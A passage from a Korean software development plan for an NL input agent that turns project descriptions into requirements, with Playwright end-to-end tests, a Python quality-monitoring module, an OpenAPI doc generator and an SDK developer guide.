    const updatedType = await page.textContent('[data-testid="project-type"]');
    expect(updatedType).toBe("E-commerce Web Application");

    // 6. 신뢰도 점수 확인
    const confidence = await page.textContent(
      '[data-testid="confidence-score"]'
    );
    expect(parseFloat(confidence)).toBeGreaterThan(0.8);
  });

  test("다국어 입력 처리", async ({ page }) => {
    const multilingualDescriptions = [
      {
        lang: "es",
        text: "Necesito una aplicación web para gestión de tareas",
        expectedType: "Web Application",
      },
      {
        lang: "fr",
        text: "Je veux créer une application mobile pour le commerce électronique",
        expectedType: "Mobile Application",
      },
      {
        lang: "ko",
        text: "실시간 채팅 기능이 있는 소셜 미디어 플랫폼을 만들고 싶습니다",
        expectedType: "Social Media Platform",
      },
    ];

    for (const { lang, text, expectedType } of multilingualDescriptions) {
      await test.step(`Testing ${lang} input`, async () => {
        await helper.submitProjectDescription(text);
        await helper.waitForAnalysis();

        // 언어 감지 확인
        const detectedLang = await page.textContent(
          '[data-testid="detected-language"]'
        );
        expect(detectedLang).toBe(lang);

        // 프로젝트 타입 확인
        const projectType = await page.textContent(
          '[data-testid="project-type"]'
        );
        expect(projectType).toBe(expectedType);

        // 번역된 요구사항 확인 (영어로)
        const requirements = await page.$$eval(
          '[data-testid="requirement-item"]',
          (elements) => elements.map((el) => el.textContent)
        );
        expect(requirements.every((r) => /^[a-zA-Z\s]+$/.test(r))).toBe(true);
      });
    }
  });

  test("실시간 협업 기능", async ({ page, context }) => {
    // 두 번째 브라우저 컨텍스트 생성
    const page2 = await context.newPage();
    const helper2 = new NLAgentE2EHelper(page2);
    await helper2.login("test_user2", "test_password2");

    // 1. 첫 번째 사용자가 프로젝트 설명 시작
    await helper.submitProjectDescription("Building a collaborative platform");

    // 2. 두 번째 사용자가 같은 프로젝트 참여
    const projectUrl = page.url();
    await page2.goto(projectUrl);

    // 3. 실시간 업데이트 확인
    await page.fill(
      '[data-testid="additional-requirements"]',
      "Need real-time features"
    );

    // 두 번째 사용자 화면에 업데이트 표시
    await expect(
      page2.locator('[data-testid="live-update-indicator"]')
    ).toBeVisible();
    await expect(page2.locator("text=Need real-time features")).toBeVisible({
      timeout: 5000,
    });

    // 4. 동시 편집 충돌 해결
    await page.fill('[data-testid="tech-stack-input"]', "React, Node.js");
    await page2.fill('[data-testid="tech-stack-input"]', "Vue, Django");

    // 충돌 해결 UI 표시
    await expect(
      page.locator('[data-testid="conflict-resolution"]')
    ).toBeVisible();
    await page.click('[data-testid="merge-changes"]');

    // 병합된 결과 확인
    const mergedTech = await page.textContent(
      '[data-testid="tech-stack-final"]'
    );
    expect(mergedTech).toContain("React");
    expect(mergedTech).toContain("Vue");
  });

  test("오류 처리 및 복구", async ({ page }) => {
    // 1. 네트워크 오류 시뮬레이션
    await page.route("**/api/v1/nl-input/analyze", (route) => {
      route.abort("failed");
    });

    await helper.submitProjectDescription("Test project with network error");

    // 오류 메시지 표시
    await expect(page.locator('[data-testid="error-message"]')).toContainText(
      "Network error occurred"
    );

    // 재시도 버튼 표시
    await expect(page.locator('[data-testid="retry-button"]')).toBeVisible();

    // 2. 네트워크 복구 및 재시도
    await page.unroute("**/api/v1/nl-input/analyze");
    await page.click('[data-testid="retry-button"]');

    // 성공적인 분석
    await helper.waitForAnalysis();
    await expect(page.locator('[data-testid="project-type"]')).toBeVisible();

    // 3. 세션 만료 처리
    await page.evaluate(() => {
      localStorage.removeItem("auth_token");
    });

    await helper.submitProjectDescription("Test after session expiry");

    // 로그인 페이지로 리다이렉트
    await page.waitForURL("/login");

    // 재로그인 후 이전 작업 복구
    await helper.login("test_user", "test_password");
    await expect(page.locator('[data-testid="recovered-draft"]')).toContainText(
      "Test after session expiry"
    );
  });
});

// Visual Regression 테스트
test.describe("Visual Regression Tests", () => {
  test("분석 결과 UI 스냅샷", async ({ page }) => {
    const helper = new NLAgentE2EHelper(page);
    await helper.login("test_user", "test_password");

    await helper.submitProjectDescription(
      "E-commerce platform with React and Node.js"
    );
    await helper.waitForAnalysis();

    // 전체 페이지 스냅샷
    await expect(page).toHaveScreenshot("analysis-results-full.png", {
      fullPage: true,
      animations: "disabled",
    });

    // 개별 컴포넌트 스냅샷
    await expect(
      page.locator('[data-testid="requirements-section"]')
    ).toHaveScreenshot("requirements-section.png");

    await expect(
      page.locator('[data-testid="tech-stack-visualization"]')
    ).toHaveScreenshot("tech-stack-viz.png");
  });
});
```

**검증 기준**:

- [ ] 전체 사용자 플로우 테스트
- [ ] 멀티브라우저 지원
- [ ] 실시간 기능 테스트
- [ ] Visual regression 테스트

#### SubTask 4.9.4: 품질 메트릭 및 모니터링

**담당자**: QA 리드  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_quality_metrics.py
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from datetime import datetime, timedelta
import numpy as np

@dataclass
class QualityMetrics:
    accuracy: float
    precision: float
    recall: float
    f1_score: float
    confidence_calibration: float
    user_satisfaction: float
    processing_efficiency: float

class NLQualityMonitor:
    """NL Agent 품질 모니터링 시스템"""

    def __init__(self):
        self.metrics_collector = MetricsCollector()
        self.evaluation_engine = EvaluationEngine()
        self.alert_manager = AlertManager()
        self.report_generator = ReportGenerator()

    async def evaluate_quality(
        self,
        time_window: timedelta = timedelta(hours=24)
    ) -> QualityMetrics:
        """품질 메트릭 평가"""

        # 데이터 수집
        end_time = datetime.utcnow()
        start_time = end_time - time_window

        evaluation_data = await self.metrics_collector.collect_evaluation_data(
            start_time,
            end_time
        )

        # 정확도 계산
        accuracy = await self._calculate_accuracy(evaluation_data)

        # 정밀도/재현율 계산
        precision, recall = await self._calculate_precision_recall(evaluation_data)

        # F1 스코어
        f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0

        # 신뢰도 보정
        confidence_calibration = await self._calculate_confidence_calibration(
            evaluation_data
        )

        # 사용자 만족도
        user_satisfaction = await self._calculate_user_satisfaction(evaluation_data)

        # 처리 효율성
        processing_efficiency = await self._calculate_processing_efficiency(
            evaluation_data
        )

        metrics = QualityMetrics(
            accuracy=accuracy,
            precision=precision,
            recall=recall,
            f1_score=f1_score,
            confidence_calibration=confidence_calibration,
            user_satisfaction=user_satisfaction,
            processing_efficiency=processing_efficiency
        )

        # 임계값 확인 및 알림
        await self._check_quality_thresholds(metrics)

        return metrics

    async def _calculate_accuracy(
        self,
        data: Dict[str, Any]
    ) -> float:
        """정확도 계산"""

        correct_predictions = 0
        total_predictions = 0

        for sample in data.get("samples", []):
            if sample["predicted_type"] == sample["actual_type"]:
                correct_predictions += 1
            total_predictions += 1

        return correct_predictions / total_predictions if total_predictions > 0 else 0

    async def _calculate_confidence_calibration(
        self,
        data: Dict[str, Any]
    ) -> float:
        """신뢰도 보정 계산 (ECE - Expected Calibration Error)"""

        bins = np.linspace(0, 1, 11)
        bin_accuracies = []
        bin_confidences = []
        bin_counts = []

        for i in range(len(bins) - 1):
            bin_mask = (
                (data["confidence_scores"] >= bins[i]) &
                (data["confidence_scores"] < bins[i + 1])
            )

            if np.sum(bin_mask) > 0:
                bin_accuracies.append(np.mean(data["correct"][bin_mask]))
                bin_confidences.append(np.mean(data["confidence_scores"][bin_mask]))
                bin_counts.append(np.sum(bin_mask))

        # ECE 계산
        total_samples = sum(bin_counts)
        ece = sum(
            (count / total_samples) * abs(acc - conf)
            for acc, conf, count in zip(bin_accuracies, bin_confidences, bin_counts)
        )

        return 1 - ece  # 1에 가까울수록 좋음

class QualityAlertManager:
    """품질 알림 관리"""

    def __init__(self):
        self.thresholds = {
            "accuracy": 0.85,
            "f1_score": 0.80,
            "user_satisfaction": 0.75,
            "processing_efficiency": 0.70,
            "response_time_p95": 2000,  # ms
            "error_rate": 0.05
        }
        self.notification_channels = ["slack", "email", "pagerduty"]

    async def check_and_alert(
        self,
        metrics: Dict[str, float]
    ):
        """메트릭 확인 및 알림"""

        alerts = []

        for metric_name, threshold in self.thresholds.items():
            current_value = metrics.get(metric_name, 0)

            if metric_name == "error_rate":
                # 에러율은 낮을수록 좋음
                if current_value > threshold:
                    alerts.append({
                        "metric": metric_name,
                        "current": current_value,
                        "threshold": threshold,
                        "severity": "critical" if current_value > threshold * 2 else "warning"
                    })
            else:
                # 다른 메트릭은 높을수록 좋음
                if current_value < threshold:
                    alerts.append({
                        "metric": metric_name,
                        "current": current_value,
                        "threshold": threshold,
                        "severity": "critical" if current_value < threshold * 0.8 else "warning"
                    })

        if alerts:
            await self._send_alerts(alerts)

    async def _send_alerts(self, alerts: List[Dict[str, Any]]):
        """알림 전송"""

        for alert in alerts:
            message = self._format_alert_message(alert)

            for channel in self.notification_channels:
                if channel == "slack":
                    await self._send_slack_alert(message, alert["severity"])
                elif channel == "email":
                    await self._send_email_alert(message, alert["severity"])
                elif channel == "pagerduty" and alert["severity"] == "critical":
                    await self._trigger_pagerduty(message)

class QualityDashboard:
    """품질 대시보드 생성"""

    def __init__(self):
        self.metrics_store = MetricsStore()
        self.visualizer = MetricsVisualizer()

    async def generate_dashboard(
        self,
        time_range: str = "24h"
    ) -> Dict[str, Any]:
        """품질 대시보드 데이터 생성"""

        # 시계열 데이터
        time_series_data = await self._get_time_series_metrics(time_range)

        # 현재 상태
        current_metrics = await self._get_current_metrics()

        # 트렌드 분석
        trends = await self._analyze_trends(time_series_data)

        # 이상 감지
        anomalies = await self._detect_anomalies(time_series_data)

        return {
            "timestamp": datetime.utcnow().isoformat(),
            "time_range": time_range,
            "current_state": {
                "overall_health": self._calculate_health_score(current_metrics),
                "metrics": current_metrics,
                "status_by_component": await self._get_component_status()
            },
            "time_series": {
                "accuracy": time_series_data.get("accuracy", []),
                "response_time": time_series_data.get("response_time", []),
                "throughput": time_series_data.get("throughput", []),
                "error_rate": time_series_data.get("error_rate", [])
            },
            "trends": trends,
            "anomalies": anomalies,
            "recommendations": await self._generate_recommendations(
                current_metrics,
                trends,
                anomalies
            )
        }

    def _calculate_health_score(
        self,
        metrics: Dict[str, float]
    ) -> float:
        """전체 건강도 점수 계산"""

        weights = {
            "accuracy": 0.3,
            "user_satisfaction": 0.25,
            "processing_efficiency": 0.2,
            "error_rate": 0.15,
            "response_time": 0.1
        }

        score = 0
        for metric, weight in weights.items():
            if metric in metrics:
                if metric == "error_rate":
                    # 에러율은 낮을수록 좋음
                    normalized = 1 - min(metrics[metric], 1)
                elif metric == "response_time":
                    # 응답시간은 목표 대비 비율
                    normalized = min(1, 2000 / metrics[metric]) if metrics[metric] > 0 else 1
                else:
                    normalized = min(metrics[metric], 1)

                score += normalized * weight

        return score

# 품질 보고서 생성기
class QualityReportGenerator:
    """주기적 품질 보고서 생성"""

    async def generate_weekly_report(self) -> Dict[str, Any]:
        """주간 품질 보고서"""

        end_date = datetime.utcnow()
        start_date = end_date - timedelta(days=7)

        report = {
            "report_type": "weekly_quality",
            "period": {
                "start": start_date.isoformat(),
                "end": end_date.isoformat()
            },
            "executive_summary": await self._generate_executive_summary(
                start_date,
                end_date
            ),
            "detailed_metrics": await self._collect_detailed_metrics(
                start_date,
                end_date
            ),
            "incidents": await self._get_incidents(start_date, end_date),
            "improvements": await self._identify_improvements(start_date, end_date),
            "action_items": await self._generate_action_items()
        }

        return report
```

**검증 기준**:

- [ ] 품질 메트릭 자동 수집
- [ ] 실시간 품질 모니터링
- [ ] 자동 알림 시스템
- [ ] 품질 대시보드 및 보고서

---

### Task 4.10: NL Agent 문서화 및 개발자 경험

#### SubTask 4.10.1: API 문서 자동 생성

**담당자**: 기술 문서 작성자  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_api_documentation.py
from typing import Dict, List, Any, Optional
from fastapi import FastAPI
from fastapi.openapi.utils import get_openapi
from pydantic import BaseModel, Field
import yaml
import json

class NLAPIDocumentationGenerator:
    """NL Agent API 문서 자동 생성"""

    def __init__(self, app: FastAPI):
        self.app = app
        self.examples_collector = ExamplesCollector()
        self.schema_enhancer = SchemaEnhancer()

    def generate_enhanced_openapi(self) -> Dict[str, Any]:
        """향상된 OpenAPI 스펙 생성"""

        # 기본 OpenAPI 스키마
        openapi_schema = get_openapi(
            title="T-Developer NL Input Agent API",
            version="1.0.0",
            description=self._get_api_description(),
            routes=self.app.routes
        )

        # 스키마 향상
        openapi_schema = self.schema_enhancer.enhance(openapi_schema)

        # 예제 추가
        openapi_schema = self._add_examples(openapi_schema)

        # 인증 정보 추가
        openapi_schema["components"]["securitySchemes"] = {
            "bearerAuth": {
                "type": "http",
                "scheme": "bearer",
                "bearerFormat": "JWT",
                "description": "JWT token for authentication"
            },
            "apiKey": {
                "type": "apiKey",
                "in": "header",
                "name": "X-API-Key",
                "description": "API key for service-to-service communication"
            }
        }

        # 태그 설명 추가
        openapi_schema["tags"] = self._get_tags_metadata()

        # 서버 정보
        openapi_schema["servers"] = [
            {
                "url": "https://api.t-developer.com",
                "description": "Production server"
            },
            {
                "url": "https://staging-api.t-developer.com",
                "description": "Staging server"
            },
            {
                "url": "http://localhost:8000",
                "description": "Development server"
            }
        ]

        return openapi_schema

    def _get_api_description(self) -> str:
        """API 설명 생성"""

        return """
# T-Developer NL Input Agent API

## Overview
The NL Input Agent API allows you to analyze natural language project descriptions
and convert them into structured requirements for application development.

## Key Features
- **Natural Language Processing**: Advanced NLP to understand project descriptions
- **Multi-language Support**: Process descriptions in multiple languages
- **Clarification System**: Interactive clarification for ambiguous requirements
- **Real-time Processing**: WebSocket support for real-time feedback
- **Comprehensive Analysis**: Extract technical and non-functional requirements

## Authentication
This API uses JWT tokens for authentication. Include the token in the Authorization header:
```

Authorization: Bearer <your-token>

````

## Rate Limits
- **Free tier**: 100 requests per day
- **Pro tier**: 1,000 requests per day
- **Enterprise**: Unlimited

## Getting Started
1. Obtain an API token from your dashboard
2. Make a POST request to `/api/v1/nl-input/analyze` with your project description
3. Process any clarification questions if needed
4. Receive structured requirements for your project

## Error Handling
The API uses standard HTTP status codes and returns detailed error messages in JSON format.
        """

    def _add_examples(self, schema: Dict[str, Any]) -> Dict[str, Any]:
        """API 예제 추가"""

        # 분석 엔드포인트 예제
        if "/api/v1/nl-input/analyze" in schema["paths"]:
            schema["paths"]["/api/v1/nl-input/analyze"]["post"]["examples"] = {
                "simple_web_app": {
                    "summary": "Simple Web Application",
                    "value": {
                        "description": "Build a todo list web app with user authentication",
                        "user_id": "user_123",
                        "language": "en"
                    }
                },
                "complex_platform": {
                    "summary": "Complex E-commerce Platform",
                    "value": {
                        "description": """
                        I need a comprehensive e-commerce platform with:
                        - Multi-vendor marketplace
                        - Real-time inventory management
                        - AI-powered recommendations
                        - Mobile apps for iOS and Android
                        - Payment gateway integration
                        - Admin dashboard with analytics
                        """,
                        "user_id": "user_456",
                        "context": {
                            "industry": "retail",
                            "target_market": "B2C",
                            "expected_users": 100000
                        }
                    }
                },
                "multilingual": {
                    "summary": "Multilingual Input",
                    "value": {
                        "description": "J'ai besoin d'une application de gestion de projet",
                        "user_id": "user_789",
                        "language": "fr"
                    }
                }
            }

        return schema

    def _get_tags_metadata(self) -> List[Dict[str, Any]]:
        """태그 메타데이터"""

        return [
            {
                "name": "nl-input",
                "description": "Natural language input processing endpoints",
                "externalDocs": {
                    "description": "NL Processing Guide",
                    "url": "https://docs.t-developer.com/nl-input"
                }
            },
            {
                "name": "clarification",
                "description": "Clarification question handling",
                "externalDocs": {
                    "description": "Clarification System Guide",
                    "url": "https://docs.t-developer.com/clarification"
                }
            },
            {
                "name": "analysis",
                "description": "Project analysis and requirements extraction"
            },
            {
                "name": "realtime",
                "description": "WebSocket endpoints for real-time processing"
            }
        ]

# API 모델 문서화
class DocumentedModel(BaseModel):
    """문서화된 Pydantic 모델 베이스"""

    class Config:
        json_schema_extra = {
            "example": {}
        }

class NLInputRequest(DocumentedModel):
    """프로젝트 설명 분석 요청"""

    description: str = Field(
        ...,
        description="Natural language description of the project",
        min_length=10,
        max_length=5000,
        example="I need a React web app with user authentication and a dashboard"
    )

    user_id: str = Field(
        ...,
        description="Unique identifier of the user",
        example="user_123456"
    )

    language: Optional[str] = Field(
        "en",
        description="Language code of the description (ISO 639-1)",
        pattern="^[a-z]{2}$",
        example="en"
    )

    context: Optional[Dict[str, Any]] = Field(
        None,
        description="Additional context for better analysis",
        example={
            "industry": "healthcare",
            "target_audience": "doctors",
            "budget": "medium"
        }
    )

    preferences: Optional[Dict[str, Any]] = Field(
        None,
        description="User preferences for technology choices",
        example={
            "frontend": ["React", "Vue"],
            "backend": ["Node.js"],
            "cloud": "AWS"
        }
    )

    class Config:
        json_schema_extra = {
            "example": {
                "description": "Build an e-commerce platform with React and Node.js. "
                              "Need user authentication, product catalog, shopping cart, "
                              "and payment integration with Stripe.",
                "user_id": "user_123456",
                "language": "en",
                "context": {
                    "industry": "retail",
                    "expected_traffic": "10000 users/day"
                }
            }
        }

class ProjectRequirements(DocumentedModel):
    """추출된 프로젝트 요구사항"""

    project_id: str = Field(
        ...,
        description="Unique project identifier",
        example="proj_abc123"
    )

    project_type: str = Field(
        ...,
        description="Detected project type",
        example="web_application"
    )

    technical_requirements: List[Dict[str, Any]] = Field(
        ...,
        description="List of technical/functional requirements",
        example=[
            {
                "id": "req_001",
                "description": "User authentication system",
                "priority": "high",
                "category": "security"
            }
        ]
    )

    non_functional_requirements: List[Dict[str, Any]] = Field(
        ...,
        description="List of non-functional requirements",
        example=[
            {
                "id": "nfr_001",
                "type": "performance",
                "description": "Page load time < 2 seconds",
                "metric": "response_time",
                "target": "2s"
            }
        ]
    )

    technology_preferences: Dict[str, List[str]] = Field(
        ...,
        description="Recommended technology stack",
        example={
            "frontend": ["React", "TypeScript"],
            "backend": ["Node.js", "Express"],
            "database": ["PostgreSQL"],
            "cloud": ["AWS"]
        }
    )

    constraints: List[Dict[str, Any]] = Field(
        default_factory=list,
        description="Project constraints and limitations",
        example=[
            {
                "type": "budget",
                "description": "Development budget < $50,000"
            }
        ]
    )

    confidence_score: float = Field(
        ...,
        description="Confidence score of the analysis (0-1)",
        ge=0,
        le=1,
        example=0.92
    )

# Markdown 문서 생성기
class MarkdownDocGenerator:
    """Markdown 형식 API 문서 생성"""

    def generate_api_reference(self, openapi_spec: Dict[str, Any]) -> str:
        """API 레퍼런스 생성"""

        md_content = []

        # 헤더
        md_content.append(f"# {openapi_spec['info']['title']}")
        md_content.append(f"\nVersion: {openapi_spec['info']['version']}")
        md_content.append(f"\n{openapi_spec['info']['description']}")

        # 인증
        md_content.append("\n## Authentication")
        for scheme_name, scheme in openapi_spec["components"]["securitySchemes"].items():
            md_content.append(f"\n### {scheme_name}")
            md_content.append(f"- Type: {scheme['type']}")
            md_content.append(f"- Description: {scheme.get('description', 'N/A')}")

        # 엔드포인트
        md_content.append("\n## Endpoints")

        for path, methods in openapi_spec["paths"].items():
            for method, details in methods.items():
                if method in ["get", "post", "put", "delete", "patch"]:
                    md_content.append(f"\n### {method.upper()} {path}")
                    md_content.append(f"\n{details.get('summary', '')}")
                    md_content.append(f"\n{details.get('description', '')}")

                    # 파라미터
                    if "parameters" in details:
                        md_content.append("\n#### Parameters")
                        for param in details["parameters"]:
                            md_content.append(
                                f"- **{param['name']}** ({param['in']}): "
                                f"{param.get('description', '')} "
                                f"{'(required)' if param.get('required') else '(optional)'}"
                            )

                    # 요청 바디
                    if "requestBody" in details:
                        md_content.append("\n#### Request Body")
                        content = details["requestBody"].get("content", {})
                        if "application/json" in content:
                            schema = content["application/json"].get("schema", {})
                            md_content.append("```json")
                            md_content.append(json.dumps(
                                self._get_example_from_schema(schema),
                                indent=2
                            ))
                            md_content.append("```")

                    # 응답
                    md_content.append("\n#### Responses")
                    for status_code, response in details.get("responses", {}).items():
                        md_content.append(f"\n**{status_code}**: {response.get('description', '')}")

                        if "content" in response:
                            content = response["content"].get("application/json", {})
                            if "schema" in content:
                                md_content.append("```json")
                                md_content.append(json.dumps(
                                    self._get_example_from_schema(content["schema"]),
                                    indent=2
                                ))
                                md_content.append("```")

        return "\n".join(md_content)
````

**검증 기준**:

- [ ] OpenAPI 3.0 스펙 생성
- [ ] 풍부한 예제 포함
- [ ] 다양한 형식 지원 (JSON, YAML, Markdown)
- [ ] 인터랙티브 문서 (Swagger UI)

#### SubTask 4.10.2: 개발자 가이드 및 튜토리얼

**담당자**: 개발자 경험 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

````markdown
# backend/docs/nl-agent-developer-guide.md

# NL Input Agent Developer Guide

## Table of Contents

1. [Getting Started](#getting-started)
2. [Core Concepts](#core-concepts)
3. [Integration Guide](#integration-guide)
4. [Advanced Features](#advanced-features)
5. [Best Practices](#best-practices)
6. [Troubleshooting](#troubleshooting)

## Getting Started

### Installation

```bash
# Using npm
npm install @t-developer/nl-agent-sdk

# Using yarn
yarn add @t-developer/nl-agent-sdk

# Using pip (Python)
pip install t-developer-nl-agent
```
````

### Quick Start

```typescript
import { NLInputClient } from "@t-developer/nl-agent-sdk";

// Initialize the client
const client = new NLInputClient({
  apiKey: "your-api-key",
  apiUrl: "https://api.t-developer.com",
});

// Analyze a project description
async function analyzeProject() {
  try {
    const result = await client.analyzeProjectDescription({
      description: "I need a task management web app with user authentication",
      userId: "user_123",
    });

    console.log("Project Type:", result.requirements.projectType);
    console.log("Technologies:", result.requirements.technologyPreferences);

    // Handle clarifications if needed
    if (result.clarificationNeeded) {
      const answers = await promptUserForClarifications(
        result.clarificationQuestions
      );
      const finalResult = await client.processClarification(
        result.sessionId,
        answers
      );
    }
  } catch (error) {
    console.error("Analysis failed:", error);
  }
}
```

## Core Concepts

### 1. Project Description Analysis

The NL Agent analyzes natural language descriptions to extract:

- **Project Type**: Web app, mobile app, API, etc.
- **Technical Requirements**: Features and functionalities
- **Non-functional Requirements**: Performance, security, scalability
- **Technology Stack**: Recommended technologies
- **Constraints**: Budget, timeline, regulatory

### 2. Clarification System

When the input is ambiguous, the agent generates clarification questions:

```typescript
interface ClarificationQuestion {
  id: string;
  question: string;
  category: "project_type" | "features" | "technical" | "constraints";
  options?: string[];
  required: boolean;
  impact: "high" | "medium" | "low";
}
```

### 3. Confidence Scoring

Each analysis includes a confidence score (0-1) indicating the certainty of the extraction:

- **0.9+**: High confidence, minimal ambiguity
- **0.7-0.9**: Good confidence, some assumptions made
- **0.5-0.7**: Moderate confidence, clarifications recommended
- **<0.5**: Low confidence, clarifications required

## Integration Guide

### REST API Integration

```python
import requests
import json

class NLAgentClient:
    def __init__(self, api_key, base_url="https://api.t-developer.com"):
        self.api_key = api_key
        self.base_url = base_url
        self.headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }

    def analyze_description(self, description, user_id, **kwargs):
        """Analyze a project description"""

        payload = {
            "description": description,
            "user_id": user_id,
            **kwargs
        }

        response = requests.post(
            f"{self.base_url}/api/v1/nl-input/analyze",
            headers=self.headers,
            json=payload
        )

        response.raise_for_status()
        return response.json()

    def process_clarification(self, session_id, answers):
        """Process clarification answers"""

        response = requests.post(
            f"{self.base_url}/api/v1/nl-input/clarify/{session_id}",
            headers=self.headers,
            json={"answers": answers}
        )

        response.raise_for_status()
        return response.json()

# Usage example
client = NLAgentClient("your-api-key")

# Initial analysis
result = client.analyze_description(
    "Build a social media app with real-time chat",
    "user_123",
    language="en"
)

print(f"Project Type: {result['requirements']['project_type']}")
print(f"Confidence: {result['confidence_score']}")

# Handle clarifications
if result['clarification_needed']:
    # Collect user answers
    answers = {
        q['id']: input(f"{q['question']}: ")
        for q in result['clarification_questions']
    }

    # Submit clarifications
    final_result = client.process_clarification(
        result['session_id'],
        answers
    )
```

### GraphQL Integration

```graphql
# Query for analyzing a project
mutation AnalyzeProject($input: AnalyzeInput!) {
  analyzeProjectDescription(input: $input) {
    projectId
    status
    requirements {
      projectType
      technicalRequirements {
        id
        description
        priority
        category
      }
      technologyPreferences {
        frontend
        backend
        database
      }
    }
    clarificationNeeded
    clarificationQuestions {
      id
      question
      options
      required
    }
    confidenceScore
  }
}

# Variables
{
  "input": {
    "description": "E-commerce platform with payment integration",
    "userId": "user_123",
    "preferences": {
      "projectType": "WEB_APPLICATION",
      "techStack": ["React", "Node.js"]
    }
  }
}
```

### WebSocket Real-time Integration

```javascript
// Real-time analysis with feedback
const ws = new WebSocket("wss://api.t-developer.com/ws/nl-input/realtime");

ws.onopen = () => {
  // Start analysis
  ws.send(
    JSON.stringify({
      type: "start_analysis",
      data: {
        description: "Building a project management tool",
        sessionId: "session_123",
      },
    })
  );
};

ws.onmessage = (event) => {
  const message = JSON.parse(event.data);

  switch (message.type) {
    case "analysis_progress":
      console.log(`Progress: ${message.progress}%`);
      break;

    case "clarification_needed":
      // Show clarification UI
      displayClarificationQuestions(message.questions);
      break;

    case "analysis_complete":
      console.log("Analysis complete:", message.requirements);
      break;

    case "error":
      console.error("Analysis error:", message.error);
      break;
  }
};

// Send feedback during analysis
function sendFeedback(feedback) {
  ws.send(
    JSON.stringify({
      type: "feedback",
      data: {
        type: "correction",
        content: feedback,
      },
    })
  );
}
```

## Advanced Features

### 1. Multi-language Support

```typescript
// Analyze in different languages
const results = await Promise.all([
  client.analyzeProjectDescription({
    description: "Necesito una aplicación web de comercio electrónico",
    userId: "user_123",
    language: "es",
  }),
  client.analyzeProjectDescription({
    description: "電子商取引のウェブアプリケーションが必要です",
    userId: "user_123",
    language: "ja",
  }),
]);

// Results will be in English regardless of input language
```

### 2. Context-Aware Analysis

```typescript
// Provide additional context for better analysis
const result = await client.analyzeProjectDescription({
  description: "Build a platform for our company",
  userId: "user_123",
  context: {
    industry: "healthcare",
    companySize: "enterprise",
    existingStack: ["Java", "Oracle"],
    regulations: ["HIPAA", "GDPR"],
    targetAudience: "hospitals",
  },
});

// The agent will consider healthcare-specific requirements
// and compliance needs in its analysis
```

### 3. Batch Processing

```typescript
// Process multiple descriptions efficiently
const descriptions = [
  "E-commerce site with inventory management",
  "Mobile app for fitness tracking",
  "API for payment processing",
];

const results = await client.batchAnalyze({
  descriptions: descriptions.map((desc, i) => ({
    id: `batch_${i}`,
    description: desc,
    userId: "user_123",
  })),
});

// Results are returned in the same order
results.forEach((result, index) => {
  console.log(`Project ${index + 1}: ${result.requirements.projectType}`);
});
```

### 4. Custom Processors

```typescript
// Register custom processors for domain-specific analysis
client.registerProcessor({
  name: "healthcare-processor",
  process: async (input) => {
    // Custom healthcare-specific logic
    const healthcareTerms = extractHealthcareTerms(input);
    const complianceReqs = identifyComplianceRequirements(input);

    return {
      domainSpecific: {
        medicalTerms: healthcareTerms,
        compliance: complianceReqs,
        recommendations: getHealthcareRecommendations(input),
      },
    };
  },
});

// Use with domain hint
const result = await client.analyzeProjectDescription({
  description: "Patient management system with EHR integration",
  userId: "user_123",
  options: {
    processors: ["healthcare-processor"],
  },
});
```

## Best Practices

### 1. Input Quality

```typescript
// ❌ Poor input
"make app"

// ✅ Good input
"Build a task management web application with user authentication,
 team collaboration features, and real-time updates"

// ✅ Excellent input
`I need a project management platform with the following requirements:
 - User authentication (email and OAuth)
 - Project creation and task assignment
 - Real-time collaboration with WebSockets
 - File attachments (up to 100MB)
 - Email notifications
 - REST API for third-party integrations
 - Target: 1000 concurrent users
 - Tech preference: React frontend, Node.js backend`
```

### 2. Error Handling

```typescript
try {
  const result = await client.analyzeProjectDescription({
    description: userInput,
    userId: userId,
  });

  // Always check confidence score
  if (result.confidenceScore < 0.7) {
    console.warn("Low confidence analysis, consider clarifications");
  }
} catch (error) {
  if (error.code === "RATE_LIMIT_EXCEEDED") {
    // Handle rate limiting
    const retryAfter = error.retryAfter;
    setTimeout(() => retryAnalysis(), retryAfter * 1000);
  } else if (error.code === "INVALID_INPUT") {
    // Handle validation errors
    showValidationError(error.message);
  } else if (error.code === "CLARIFICATION_TIMEOUT") {
    // Handle clarification timeout
    restartAnalysis();
  } else {
    // Generic error handling
    console.error("Unexpected error:", error);
    showGenericError();
  }
}
```

### 3. Performance Optimization

```typescript
// Use caching for repeated analyses
const cache = new Map();

async function analyzeWithCache(description, userId) {
  const cacheKey = `${userId}:${hashString(description)}`;

  // Check cache
  if (cache.has(cacheKey)) {
    const cached = cache.get(cacheKey);
    if (Date.now() - cached.timestamp < 3600000) {
      // 1 hour
      return cached.result;
    }
  }

  // Perform analysis
  const result = await client.analyzeProjectDescription({
    description,
    userId,
  });

  // Cache result
  cache.set(cacheKey, {
    result,
    timestamp: Date.now(),
  });

  return result;
}

// Use streaming for large inputs
const stream = client.streamAnalysis({
  description: veryLongDescription,
  userId: "user_123",
});

stream.on("progress", (progress) => {
  updateProgressBar(progress.percentage);
});

stream.on("partial", (partial) => {
  // Show partial results as they become available
  updateUI(partial);
});

stream.on("complete", (result) => {
  // Final result
  displayFinalResult(result);
});
```

## Troubleshooting

### Common Issues

#### 1. Low Confidence Scores

**Problem**: Analysis returns confidence score < 0.5

**Solutions**:

```typescript
// Add more detail to the description
const improved = addProjectDetails(originalDescription, {
  features: ["list", "of", "features"],
  targetAudience: "specific audience",
  technicalRequirements: ["performance", "security"],
});

// Provide context
const result = await client.analyzeProjectDescription({
  description: improved,
  context: {
    projectType: "web",
    industry: "finance",
  },
});

// Use guided mode
const guided = await client.guidedAnalysis({
  userId: "user_123",
  template: "web_application",
});
```

#### 2. Timeout Errors

**Problem**: Analysis times out for complex descriptions

**Solutions**:

```typescript
// Increase timeout
const client = new NLInputClient({
  apiKey: "your-key",
  timeout: 60000, // 60 seconds
});

// Use async processing for large inputs
const job = await client.submitAsyncAnalysis({
  description: complexDescription,
  userId: "user_123",
});

// Poll for results
const result = await client.waitForAnalysis(job.jobId, {
  pollInterval: 2000,
  maxAttempts: 30,
});
```

#### 3. Clarification Loop

**Problem**: Too many clarification questions

**Solutions**:

```typescript
// Set clarification preferences
const result = await client.analyzeProjectDescription({
  description: userInput,
  userId: "user_123",
  options: {
